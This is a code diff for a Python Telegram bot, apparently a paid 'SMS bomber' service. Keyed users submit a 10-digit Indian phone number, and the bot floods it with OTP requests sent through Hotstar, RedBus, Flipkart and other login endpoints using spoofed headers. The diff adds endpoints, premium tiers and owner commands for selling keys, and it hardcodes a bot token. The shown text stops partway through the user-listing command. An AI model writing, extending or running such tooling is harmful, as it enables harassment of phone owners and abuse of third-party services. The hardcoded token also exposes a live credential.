@@ -20,10 +20,10 @@ logger = logging.getLogger(__name__)
 
 # --- Configuration ---
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
-OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))  # Your Telegram ID
+OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))
 BOT_USERNAME = "@BeStChEaT_OwNeR"
 
-# --- Database (JSON file for Railway) ---
+# --- Database ---
 DB_FILE = 'keys_db.json'
 
 def load_db():
@@ -31,20 +31,18 @@ def load_db():
         with open(DB_FILE, 'r') as f:
             return json.load(f)
     except:
-        return {'keys': {}, 'users': {}, 'blocked': []}
+        return {'keys': {}, 'users': {}, 'blocked': [], 'premium': []}
 
 def save_db(db):
     with open(DB_FILE, 'w') as f:
         json.dump(db, f, indent=4)
 
-# --- Key Generation ---
+# --- Key System ---
 def generate_key():
-    """Generate a random 16-character key"""
     chars = string.ascii_uppercase + string.digits
     return ''.join(secrets.choice(chars) for _ in range(16))
 
-def create_key(days=7, max_uses=100):
-    """Create a new key with expiry and usage limit"""
+def create_key(days=7, max_uses=100, is_premium=False):
     db = load_db()
     key = generate_key()
     db['keys'][key] = {
@@ -53,43 +51,34 @@ def create_key(days=7, max_uses=100):
         'max_uses': max_uses,
         'used': 0,
         'users': [],
-        'active': True
+        'active': True,
+        'is_premium': is_premium
     }
     save_db(db)
     return key
 
 def validate_key(key, user_id):
-    """Validate and use a key"""
     db = load_db()
     
-    # Check if key exists
     if key not in db['keys']:
-        return False, "Invalid key!"
+        return False, "❌ Invalid Key! Please check and try again."
     
     key_data = db['keys'][key]
     
-    # Check if key is active
     if not key_data['active']:
-        return False, "Key has been blocked!"
+        return False, "❌ This key has been blocked by admin!"
     
-    # Check expiry
     expiry = datetime.fromisoformat(key_data['expiry'])
     if datetime.now() > expiry:
-        return False, "Key has expired!"
+        return False, "❌ Key has expired! Please get a new key."
     
-    # Check usage limit
     if key_data['used'] >= key_data['max_uses']:
-        return False, "Key usage limit exceeded!"
+        return False, "❌ Key usage limit exceeded!"
     
-    # Check if user already used this key
-    if str(user_id) in key_data['users']:
-        return True, "Already activated"
+    if str(user_id) not in key_data['users']:
+        key_data['used'] += 1
+        key_data['users'].append(str(user_id))
     
-    # Use the key
-    key_data['used'] += 1
-    key_data['users'].append(str(user_id))
-    
-    # Add user to users list
     if str(user_id) not in db['users']:
         db['users'][str(user_id)] = {
             'keys': [],
@@ -97,14 +86,22 @@ def validate_key(key, user_id):
             'created': datetime.now().isoformat()
         }
     
-    db['users'][str(user_id)]['keys'].append(key)
+    if key not in db['users'][str(user_id)]['keys']:
+        db['users'][str(user_id)]['keys'].append(key)
     db['users'][str(user_id)]['used_count'] += 1
     
     save_db(db)
-    return True, "Key activated successfully!"
+    return True, "✅ Premium Access Activated!"
+
+def delete_key(key):
+    db = load_db()
+    if key in db['keys']:
+        del db['keys'][key]
+        save_db(db)
+        return True
+    return False
 
 def block_key(key):
-    """Block a key"""
     db = load_db()
     if key in db['keys']:
         db['keys'][key]['active'] = False
@@ -113,7 +110,6 @@ def block_key(key):
     return False
 
 def unblock_key(key):
-    """Unblock a key"""
     db = load_db()
     if key in db['keys']:
         db['keys'][key]['active'] = True
@@ -121,13 +117,7 @@ def unblock_key(key):
         return True
     return False
 
-def is_user_blocked(user_id):
-    """Check if user is blocked"""
-    db = load_db()
-    return str(user_id) in db['blocked']
-
 def block_user(user_id):
-    """Block a user"""
     db = load_db()
     if str(user_id) not in db['blocked']:
         db['blocked'].append(str(user_id))
@@ -136,7 +126,6 @@ def block_user(user_id):
     return False
 
 def unblock_user(user_id):
-    """Unblock a user"""
     db = load_db()
     if str(user_id) in db['blocked']:
         db['blocked'].remove(str(user_id))
@@ -144,8 +133,11 @@ def unblock_user(user_id):
         return True
     return False
 
+def is_user_blocked(user_id):
+    db = load_db()
+    return str(user_id) in db['blocked']
+
 def has_valid_key(user_id):
-    """Check if user has any valid key"""
     db = load_db()
     user_id = str(user_id)
     
@@ -159,9 +151,19 @@ def has_valid_key(user_id):
                         return True
     return False
 
-# --- SMS Bombing APIs (Working) ---
+def is_premium_user(user_id):
+    db = load_db()
+    user_id = str(user_id)
+    
+    if user_id in db['users']:
+        for key in db['users'][user_id]['keys']:
+            if key in db['keys']:
+                if db['keys'][key].get('is_premium', False):
+                    return True
+    return False
+
+# --- SMS Bombing APIs ---
 def get_apis(target):
-    """All working SMS APIs"""
     apis = [
         # Hotstar
         {
@@ -176,7 +178,6 @@ def get_apis(target):
                 'x-hs-platform': 'PCTV',
                 'x-country-code': 'IN',
                 'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
-                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
                 'x-hs-appversion': '5.0.40',
                 'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
                 'accept': '*/*',
@@ -431,6 +432,48 @@ def get_apis(target):
                 'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
             },
             'data': {"identifier": target}
+        },
+        # RedBus
+        {
+            'url': f'https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined',
+            'method': 'GET',
+            'headers': {
+                'Host': 'm.redbus.in',
+                'accept': 'application/json, text/plain, */*',
+                'save-data': 'on',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://m.redbus.in/preregister',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {}
+        },
+        # Flipkart
+        {
+            'url': 'https://1.rome.api.flipkart.com/1/action/view',
+            'method': 'POST',
+            'headers': {
+                'Host': '1.rome.api.flipkart.com',
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'origin': 'https://www.flipkart.com',
+                'referer': 'https://www.flipkart.com/login',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {
+                "actionRequestContext": {
+                    "type": "LOGIN_IDENTITY_VERIFY",
+                    "loginIdPrefix": "+91",
+                    "loginId": target,
+                    "loginType": "MOBILE",
+                    "verificationType": "OTP",
+                    "screenName": "LOGIN_V4_MOBILE",
+                }
+            }
         }
     ]
     return apis
@@ -464,224 +507,194 @@ def send_sms(api_data):
 # --- Telegram Bot Handlers ---
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/start command"""
+    """Start command with Premium UI"""
     user_id = update.effective_user.id
+    user_name = update.effective_user.first_name
     
-    # Check if user is blocked
     if is_user_blocked(user_id):
         await update.message.reply_text(
-            "🚫 You have been blocked from using this bot!\n\n"
-            "Contact @BeStChEaT_OwNeR for support."
+            "🚫 *YOU HAVE BEEN BLOCKED!*\n\n"
+            "You are not allowed to use this bot.\n"
+            "Contact @BeStChEaT_OwNeR for support.\n\n"
+            "⚠️ *Reason:* Violation of Terms",
+            parse_mode='Markdown'
         )
         return
     
     keyboard = [
-        [InlineKeyboardButton("📞 Send Number", switch_inline_query_current_chat="")],
-        [InlineKeyboardButton("🔑 Get Key", callback_data="get_key")],
-        [InlineKeyboardButton("ℹ️ About", callback_data="about")]
+        [InlineKeyboardButton("📞 SEND NUMBER", callback_data="send_number")],
+        [InlineKeyboardButton("🔑 GET KEY FROM FATHER", url="http://BESTCHEAT_OWNER.t.me")],
+        [InlineKeyboardButton("👑 PREMIUM ACCESS", callback_data="premium_info")],
+        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
+    premium_status = "⭐ *PREMIUM USER* ⭐" if is_premium_user(user_id) else "🔓 *FREE USER*"
+    
     await update.message.reply_text(
-        f"🔥 *SMS Bomber Bot Activated!*\n\n"
-        f"👤 *User:* {update.effective_user.first_name}\n"
-        f"🤖 *Bot:* {BOT_USERNAME}\n\n"
-        f"📌 *How to use:*\n"
-        f"1️⃣ Send a 10-digit phone number\n"
-        f"2️⃣ Bot will send OTP to 15+ platforms\n"
-        f"3️⃣ Get results instantly\n\n"
-        f"🔑 *You need a valid key to use this bot!*\n"
-        f"Use /key <your_key> to activate\n\n"
-        f"⚠️ *For Educational Purpose Only*",
+        f"🔥 *WELCOME TO SMS BOMBER* 🔥\n\n"
+        f"👤 *User:* {user_name}\n"
+        f"🤖 *Bot:* @BeStChEaT_OwNeR\n"
+        f"👑 *Status:* {premium_status}\n\n"
+        f"⚡ *Features:*\n"
+        f"✅ 15+ Working APIs\n"
+        f"✅ Premium Quality Bombing\n"
+        f"✅ 24/7 Service\n"
+        f"✅ Unlimited Usage (Premium)\n\n"
+        f"📌 *How to Use:*\n"
+        f"1️⃣ Click *SEND NUMBER* button\n"
+        f"2️⃣ Send your 10-digit number\n"
+        f"3️⃣ Get instant results\n\n"
+        f"🔑 *No Key?* Click *GET KEY FROM FATHER*\n\n"
+        f"💀 *For Educational Purpose Only*",
         parse_mode='Markdown',
         reply_markup=reply_markup
     )
 
 async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/key command - Activate key"""
+    """Activate key command"""
     user_id = update.effective_user.id
     
-    # Check if user is blocked
     if is_user_blocked(user_id):
-        await update.message.reply_text(
-            "🚫 You have been blocked from using this bot!"
-        )
+        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
         return
     
-    # Get key from command
     args = context.args
     if not args:
         await update.message.reply_text(
-            "🔑 *Key System*\n\n"
-            "Usage: `/key <your_key>`\n\n"
-            "Example: `/key ABC123XYZ456`\n\n"
-            "Contact @BeStChEaT_OwNeR to get a key.",
+            "🔑 *KEY ACTIVATION*\n\n"
+            "Usage: `/key YOUR_KEY`\n\n"
+            "Example: `/key AB7X9K2M5P3Q8R1T`\n\n"
+            "📌 *Where to get key?*\n"
+            "Click *GET KEY FROM FATHER* button\n"
+            "or contact @BeStChEaT_OwNeR\n\n"
+            "💀 *Created by @BeStChEaT_OwNeR*",
             parse_mode='Markdown'
         )
         return
     
     key = args[0].upper().strip()
-    
-    # Validate key
     valid, message = validate_key(key, user_id)
     
     if valid:
+        is_premium = "⭐ *PREMIUM* ⭐" if is_premium_user(user_id) else "🔓 *STANDARD*"
         await update.message.reply_text(
-            f"✅ *Key Activated!*\n\n"
+            f"✅ *KEY ACTIVATED SUCCESSFULLY!*\n\n"
             f"🔑 Key: `{key}`\n"
+            f"👑 Type: {is_premium}\n"
             f"📝 Status: {message}\n\n"
             f"🚀 You can now use the bot!\n"
-            f"Send a 10-digit number to start bombing.",
+            f"Send any 10-digit number to start bombing.\n\n"
+            f"💀 *@BeStChEaT_OwNeR*",
             parse_mode='Markdown'
         )
     else:
         await update.message.reply_text(
-            f"❌ *Key Activation Failed!*\n\n"
+            f"❌ *KEY ACTIVATION FAILED!*\n\n"
             f"🔑 Key: `{key}`\n"
             f"❌ Reason: {message}\n\n"
-            f"Contact @BeStChEaT_OwNeR for a valid key.",
+            f"📌 *Get a valid key:*\n"
+            f"Click *GET KEY FROM FATHER* button\n"
+            f"or contact @BeStChEaT_OwNeR\n\n"
+            f"💀 *@BeStChEaT_OwNeR*",
             parse_mode='Markdown'
         )
 
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/redeem command - Owner only"""
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Help command with all commands"""
     user_id = update.effective_user.id
     
-    # Only owner can use this
-    if user_id != OWNER_ID:
-        await update.message.reply_text(
-            "❌ You are not authorized to use this command!"
-        )
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_text(
-            "🔑 *Redeem Key System*\n\n"
-            "Commands:\n"
-            "`/redeem create <days> <max_uses>` - Create a new key\n"
+    if user_id == OWNER_ID:
+        help_text = (
+            "👑 *OWNER COMMANDS*\n\n"
+            "🔑 *Key Management:*\n"
+            "`/redeem create 7 100` - Create key (days, uses)\n"
+            "`/redeem createpremium 30 999` - Create premium key\n"
             "`/redeem list` - List all keys\n"
-            "`/redeem block <key>` - Block a key\n"
-            "`/redeem unblock <key>` - Unblock a key\n"
-            "`/redeem blockuser <user_id>` - Block a user\n"
-            "`/redeem unblockuser <user_id>` - Unblock a user\n\n"
-            "Example: `/redeem create 7 100`",
-            parse_mode='Markdown'
+            "`/redeem block KEY123` - Block a key\n"
+            "`/redeem unblock KEY123` - Unblock a key\n"
+            "`/redeem delete KEY123` - Delete a key\n\n"
+            "👤 *User Management:*\n"
+            "`/redeem blockuser 123456789` - Block user\n"
+            "`/redeem unblockuser 123456789` - Unblock user\n"
+            "`/redeem users` - List all users\n\n"
+            "📊 *Stats:*\n"
+            "`/redeem stats` - Bot statistics\n"
+            "`/redeem userstats 123456789` - User stats\n\n"
+            "💀 *@BeStChEaT_OwNeR*"
         )
-        return
-    
-    action = args[0].lower()
-    
-    if action == 'create':
-        if len(args) < 3:
-            await update.message.reply_text("❌ Usage: /redeem create <days> <max_uses>")
-            return
-        
-        try:
-            days = int(args[1])
-            max_uses = int(args[2])
-            key = create_key(days, max_uses)
-            
-            await update.message.reply_text(
-                f"✅ *Key Created!*\n\n"
-                f"🔑 Key: `{key}`\n"
-                f"📅 Days: {days}\n"
-                f"📊 Max Uses: {max_uses}\n"
-                f"📝 Status: Active\n\n"
-                f"Share this key with users.",
-                parse_mode='Markdown'
-            )
-        except:
-            await update.message.reply_text("❌ Invalid input! Use numbers only.")
-    
-    elif action == 'list':
-        db = load_db()
-        if not db['keys']:
-            await update.message.reply_text("📭 No keys found!")
-            return
-        
-        text = "🔑 *All Keys*\n\n"
-        for key, data in db['keys'].items():
-            status = "✅ Active" if data['active'] else "❌ Blocked"
-            expiry = datetime.fromisoformat(data['expiry']).strftime('%Y-%m-%d')
-            text += f"• `{key}` - {status}\n"
-            text += f"  📊 {data['used']}/{data['max_uses']} used, Expires: {expiry}\n"
-        
-        await update.message.reply_text(text, parse_mode='Markdown')
-    
-    elif action == 'block':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem block <key>")
-            return
-        
-        key = args[1].upper().strip()
-        if block_key(key):
-            await update.message.reply_text(f"✅ Key `{key}` blocked successfully!")
-        else:
-            await update.message.reply_text(f"❌ Key `{key}` not found!")
-    
-    elif action == 'unblock':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem unblock <key>")
-            return
-        
-        key = args[1].upper().strip()
-        if unblock_key(key):
-            await update.message.reply_text(f"✅ Key `{key}` unblocked successfully!")
-        else:
-            await update.message.reply_text(f"❌ Key `{key}` not found!")
-    
-    elif action == 'blockuser':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem blockuser <user_id>")
-            return
-        
-        try:
-            user_id = int(args[1])
-            if block_user(user_id):
-                await update.message.reply_text(f"✅ User `{user_id}` blocked successfully!")
-            else:
-                await update.message.reply_text(f"❌ User `{user_id}` already blocked!")
-        except:
-            await update.message.reply_text("❌ Invalid user_id!")
-    
-    elif action == 'unblockuser':
-        if len(args) < 2:
-            await update.message.reply_text("❌ Usage: /redeem unblockuser <user_id>")
-            return
-        
-        try:
-            user_id = int(args[1])
-            if unblock_user(user_id):
-                await update.message.reply_text(f"✅ User `{user_id}` unblocked successfully!")
-            else:
-                await update.message.reply_text(f"❌ User `{user_id}` not found in block list!")
-        except:
-            await update.message.reply_text("❌ Invalid user_id!")
-    
     else:
-        await update.message.reply_text("❌ Invalid action! Use: create, list, block, unblock, blockuser, unblockuser")
+        help_text = (
+            "🤖 *USER COMMANDS*\n\n"
+            "📌 *Basic Commands:*\n"
+            "`/start` - Start the bot\n"
+            "`/key YOUR_KEY` - Activate your key\n"
+            "`/help` - Show this menu\n"
+            "`/status` - Check bot status\n\n"
+            "📞 *Bombing:*\n"
+            "Send any 10-digit number to bomb\n"
+            "Example: `9876543210`\n\n"
+            "🔑 *Need Key?*\n"
+            "Click *GET KEY FROM FATHER* button\n"
+            "or contact @BeStChEaT_OwNeR\n\n"
+            "💀 *@BeStChEaT_OwNeR*"
+        )
+    
+    await update.message.reply_text(help_text, parse_mode='Markdown')
+
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check bot status"""
+    db = load_db()
+    total_users = len(db['users'])
+    total_keys = len(db['keys'])
+    active_keys = sum(1 for k in db['keys'].values() if k['active'])
+    blocked_users = len(db['blocked'])
+    
+    status_text = (
+        f"🟢 *BOT STATUS*\n\n"
+        f"🤖 Bot: @BeStChEaT_OwNeR\n"
+        f"👑 Owner: @BeStChEaT_OwNeR\n"
+        f"📡 Status: ✅ Online\n"
+        f"⚡ APIs: 15+\n\n"
+        f"📊 *Statistics:*\n"
+        f"👥 Total Users: {total_users}\n"
+        f"🔑 Total Keys: {total_keys}\n"
+        f"✅ Active Keys: {active_keys}\n"
+        f"🚫 Blocked Users: {blocked_users}\n\n"
+        f"💀 *@BeStChEaT_OwNeR*"
+    )
+    await update.message.reply_text(status_text, parse_mode='Markdown')
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle phone number - MAIN BOMBING FUNCTION"""
+    """Handle phone number - Main bombing function"""
     user_id = update.effective_user.id
     
     # Check if user is blocked
     if is_user_blocked(user_id):
         await update.message.reply_text(
-            "🚫 You have been blocked from using this bot!\n\n"
-            "Contact @BeStChEaT_OwNeR for support."
+            "🚫 *YOU HAVE BEEN BLOCKED!*\n\n"
+            "Contact @BeStChEaT_OwNeR for support.",
+            parse_mode='Markdown'
         )
         return
     
     # Check if user has valid key
     if not has_valid_key(user_id):
+        keyboard = [[InlineKeyboardButton("🔑 GET KEY FROM FATHER", url="http://BESTCHEAT_OWNER.t.me")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await update.message.reply_text(
-            "🔑 *No Valid Key Found!*\n\n"
+            "🔑 *NO VALID KEY FOUND!*\n\n"
             "You need a valid key to use this bot.\n\n"
-            "Use `/key <your_key>` to activate.\n"
-            "Contact @BeStChEaT_OwNeR to get a key.",
-            parse_mode='Markdown'
+            "📌 *How to get key:*\n"
+            "1️⃣ Click the button below\n"
+            "2️⃣ Contact @BeStChEaT_OwNeR\n"
+            "3️⃣ Get your unique key\n\n"
+            "🔄 *Already have key?*\n"
+            "Use: `/key YOUR_KEY`\n\n"
+            "💀 *@BeStChEaT_OwNeR*",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
         )
         return
     
@@ -690,16 +703,21 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Check if it's a valid phone number
     if not re.match(r'^[0-9]{10}$', phone):
         await update.message.reply_text(
-            "❌ *Invalid Number!*\n\n"
-            "Please send a 10-digit phone number.\n"
-            "Example: `9876543210`",
+            "❌ *INVALID NUMBER!*\n\n"
+            "Please send a valid 10-digit number.\n"
+            "Example: `9876543210`\n\n"
+            "💀 *@BeStChEaT_OwNeR*",
             parse_mode='Markdown'
         )
         return
     
+    # Premium or Normal
+    is_premium = is_premium_user(user_id)
+    bomb_text = "⭐ *PREMIUM BOMBING* ⭐" if is_premium else "📱 *STANDARD BOMBING*"
+    
     # Send initial message
     msg = await update.message.reply_text(
-        f"📱 *Bombing Started!*\n"
+        f"{bomb_text}\n\n"
         f"🎯 Target: +91{phone}\n"
         f"⏳ Sending SMS to 15+ platforms...\n\n"
         f"⏱️ Please wait...",
@@ -710,12 +728,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     apis = get_apis(phone)
     random.shuffle(apis)
     
-    # Send SMS using all APIs
+    # Limit based on premium
+    max_apis = len(apis) if is_premium else 10
+    
+    # Send SMS
     success_count = 0
     failed_count = 0
     successful_services = []
     
-    for i, api in enumerate(apis):
+    for i, api in enumerate(apis[:max_apis]):
         if send_sms(api):
             success_count += 1
             service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
@@ -723,15 +744,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             failed_count += 1
         
-        # Update progress every 3 APIs
         if (i + 1) % 3 == 0:
             try:
                 await msg.edit_text(
-                    f"📱 *Bombing in Progress...*\n"
+                    f"{bomb_text}\n\n"
                     f"🎯 Target: +91{phone}\n"
-                    f"✅ Successful: {success_count}\n"
+                    f"✅ Success: {success_count}\n"
                     f"❌ Failed: {failed_count}\n"
-                    f"⏳ Progress: {i+1}/{len(apis)}",
+                    f"⏳ Progress: {i+1}/{max_apis}",
                     parse_mode='Markdown'
                 )
             except:
@@ -739,18 +759,18 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Final result
     result_text = (
-        f"✅ *Bombing Complete!*\n\n"
+        f"✅ *BOMBING COMPLETE!*\n\n"
         f"📞 Target: +91{phone}\n"
-        f"📨 Total Attempts: {len(apis)}\n"
-        f"✅ Successful: {success_count}\n"
+        f"👑 Type: {'⭐ PREMIUM ⭐' if is_premium else '🔓 STANDARD'}\n"
+        f"📨 Total: {max_apis}\n"
+        f"✅ Success: {success_count}\n"
         f"❌ Failed: {failed_count}\n\n"
     )
     
     if successful_services:
-        result_text += f"🟢 *Successful:* {', '.join(successful_services[:10])}\n\n"
+        result_text += f"🟢 *Services:* {', '.join(successful_services[:10])}\n\n"
     
-    result_text += f"🤖 {BOT_USERNAME}\n"
-    result_text += "⚠️ For Educational Purpose Only"
+    result_text += f"💀 *@BeStChEaT_OwNeR*"
     
     await msg.edit_text(result_text, parse_mode='Markdown')
 
@@ -760,61 +780,258 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = update.effective_user.id
     
-    if query.data == "get_key":
+    if query.data == "send_number":
         await query.edit_message_text(
-            "🔑 *How to get a key?*\n\n"
-            "1️⃣ Contact @BeStChEaT_OwNeR\n"
-            "2️⃣ Send payment (if required)\n"
-            "3️⃣ Receive your unique key\n\n"
-            "🔑 *Key Features:*\n"
-            "• 15+ Working APIs\n"
-            "• Unlimited SMS bombing\n"
-            "• 24/7 bot access\n\n"
-            "📝 *Already have a key?*\n"
-            "Use: `/key YOUR_KEY`",
+            "📞 *SEND NUMBER*\n\n"
+            "Please send your 10-digit number.\n"
+            "Example: `9876543210`\n\n"
+            "⚡ *Make sure:*\n"
+            "✅ You have a valid key\n"
+            "✅ Number is 10 digits\n"
+            "✅ No spaces or symbols\n\n"
+            "💀 *@BeStChEaT_OwNeR*",
             parse_mode='Markdown'
         )
+    
+    elif query.data == "premium_info":
+        keyboard = [[InlineKeyboardButton("🔑 GET KEY FROM FATHER", url="http://BESTCHEAT_OWNER.t.me")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            "👑 *PREMIUM ACCESS* 👑\n\n"
+            "⚡ *Premium Features:*\n"
+            "✅ All 15+ APIs\n"
+            "✅ Unlimited bombing\n"
+            "✅ Priority support\n"
+            "✅ No usage limits\n"
+            "✅ 24/7 access\n\n"
+            "🔑 *Get Premium Key:*\n"
+            "Click the button below and contact\n"
+            "@BeStChEaT_OwNeR\n\n"
+            "💰 *Price:* Contact for pricing\n\n"
+            "💀 *@BeStChEaT_OwNeR*",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+    
     elif query.data == "about":
         await query.edit_message_text(
-            f"ℹ️ *About This Bot*\n\n"
-            f"🤖 *Name:* SMS Bomber Bot\n"
-            f"👨‍💻 *Creator:* @BeStChEaT_OwNeR\n"
-            f"🔧 *Version:* 2.0\n"
-            f"📊 *APIs:* 15+ Platforms\n"
-            f"⚡ *Speed:* High\n\n"
-            f"📌 *Features:*\n"
-            f"• Key based access\n"
-            f"• 15+ working APIs\n"
-            f"• Real-time progress\n"
-            f"• Smart key management\n\n"
-            f"⚠️ *For Educational Purpose Only*",
+            "ℹ️ *ABOUT THIS BOT*\n\n"
+            "🤖 *Name:* SMS Bomber Bot\n"
+            "👨‍💻 *Creator:* @BeStChEaT_OwNeR\n"
+            "🔧 *Version:* 3.0 Premium\n"
+            "📊 *APIs:* 15+ Platforms\n"
+            "⚡ *Speed:* Ultra Fast\n\n"
+            "📌 *Features:*\n"
+            "• Premium Key System\n"
+            "• 15+ Working APIs\n"
+            "• Real-time Progress\n"
+            "• Smart Management\n"
+            "• Premium & Normal Users\n\n"
+            "💀 *@BeStChEaT_OwNeR*",
             parse_mode='Markdown'
         )
+
+# --- Owner Commands ---
+
+async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Redeem command for owner"""
+    user_id = update.effective_user.id
+    
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ You are not authorized!")
+        return
+    
+    args = context.args
+    if not args:
+        await update.message.reply_text(
+            "👑 *REDEEM COMMANDS*\n\n"
+            "🔑 *Key Management:*\n"
+            "`/redeem create 7 100` - Normal key\n"
+            "`/redeem createpremium 30 999` - Premium key\n"
+            "`/redeem list` - List all keys\n"
+            "`/redeem block KEY123` - Block key\n"
+            "`/redeem unblock KEY123` - Unblock key\n"
+            "`/redeem delete KEY123` - Delete key\n\n"
+            "👤 *User Management:*\n"
+            "`/redeem blockuser 123456789` - Block user\n"
+            "`/redeem unblockuser 123456789` - Unblock user\n"
+            "`/redeem users` - List users\n\n"
+            "📊 *Stats:*\n"
+            "`/redeem stats` - Bot stats\n\n"
+            "💀 *@BeStChEaT_OwNeR*",
+            parse_mode='Markdown'
+        )
+        return
+    
+    action = args[0].lower()
+    
+    if action == 'create':
+        if len(args) < 3:
+            await update.message.reply_text("❌ Usage: /redeem create <days> <max_uses>")
+            return
+        try:
+            days = int(args[1])
+            max_uses = int(args[2])
+            key = create_key(days, max_uses, False)
+            await update.message.reply_text(
+                f"✅ *Normal Key Created!*\n\n"
+                f"🔑 Key: `{key}`\n"
+                f"📅 Days: {days}\n"
+                f"📊 Max Uses: {max_uses}\n"
+                f"👑 Type: STANDARD\n\n"
+                f"💀 *@BeStChEaT_OwNeR*",
+                parse_mode='Markdown'
+            )
+        except:
+            await update.message.reply_text("❌ Invalid input!")
+    
+    elif action == 'createpremium':
+        if len(args) < 3:
+            await update.message.reply_text("❌ Usage: /redeem createpremium <days> <max_uses>")
+            return
+        try:
+            days = int(args[1])
+            max_uses = int(args[2])
+            key = create_key(days, max_uses, True)
+            await update.message.reply_text(
+                f"✅ *Premium Key Created!* ⭐\n\n"
+                f"🔑 Key: `{key}`\n"
+                f"📅 Days: {days}\n"
+                f"📊 Max Uses: {max_uses}\n"
+                f"👑 Type: PREMIUM\n\n"
+                f"💀 *@BeStChEaT_OwNeR*",
+                parse_mode='Markdown'
+            )
+        except:
+            await update.message.reply_text("❌ Invalid input!")
+    
+    elif action == 'list':
+        db = load_db()
+        if not db['keys']:
+            await update.message.reply_text("📭 No keys found!")
+            return
+        text = "🔑 *All Keys*\n\n"
+        for key, data in db['keys'].items():
+            status = "✅ Active" if data['active'] else "❌ Blocked"
+            premium = "⭐ PREMIUM" if data.get('is_premium', False) else "🔓 STANDARD"
+            expiry = datetime.fromisoformat(data['expiry']).strftime('%Y-%m-%d')
+            text += f"• `{key}` - {status}\n"
+            text += f"  👑 {premium} | 📊 {data['used']}/{data['max_uses']} | 📅 {expiry}\n"
+        await update.message.reply_text(text, parse_mode='Markdown')
+    
+    elif action == 'delete':
+        if len(args) < 2:
+            await update.message.reply_text("❌ Usage: /redeem delete KEY123")
+            return
+        key = args[1].upper().strip()
+        if delete_key(key):
+            await update.message.reply_text(f"✅ Key `{key}` deleted successfully!")
+        else:
+            await update.message.reply_text(f"❌ Key `{key}` not found!")
+    
+    elif action == 'block':
+        if len(args) < 2:
+            await update.message.reply_text("❌ Usage: /redeem block KEY123")
+            return
+        key = args[1].upper().strip()
+        if block_key(key):
+            await update.message.reply_text(f"✅ Key `{key}` blocked!")
+        else:
+            await update.message.reply_text(f"❌ Key `{key}` not found!")
+    
+    elif action == 'unblock':
+        if len(args) < 2:
+            await update.message.reply_text("❌ Usage: /redeem unblock KEY123")
+            return
+        key = args[1].upper().strip()
+        if unblock_key(key):
+            await update.message.reply_text(f"✅ Key `{key}` unblocked!")
+        else:
+            await update.message.reply_text(f"❌ Key `{key}` not found!")
+    
+    elif action == 'blockuser':
+        if len(args) < 2:
+            await update.message.reply_text("❌ Usage: /redeem blockuser 123456789")
+            return
+        try:
+            uid = int(args[1])
+            if block_user(uid):
+                await update.message.reply_text(f"✅ User `{uid}` blocked!")
+            else:
+                await update.message.reply_text(f"❌ User already blocked!")
+        except:
+            await update.message.reply_text("❌ Invalid user_id!")
+    
+    elif action == 'unblockuser':
+        if len(args) < 2:
+            await update.message.reply_text("❌ Usage: /redeem unblockuser 123456789")
+            return
+        try:
+            uid = int(args[1])
+            if unblock_user(uid):
+                await update.message.reply_text(f"✅ User `{uid}` unblocked!")
+            else:
+                await update.message.reply_text(f"❌ User not found in block list!")
+        except:
+            await update.message.reply_text("❌ Invalid user_id!")
+    
+    elif action == 'users':
+        db = load_db()
+        if not db['users']:
+            await update.message.reply_text("📭 No users found!")
+            return
+        text = "👥 *All Users*\n\n"
+        for uid, data in db['users'].items():
+            text += f"• User ID: `{uid}`\n"
+            text += f"  📊 Used: {data['used_count']} times\n"
+            text += f"  🔑 Keys: {len(data['keys'])}\n"
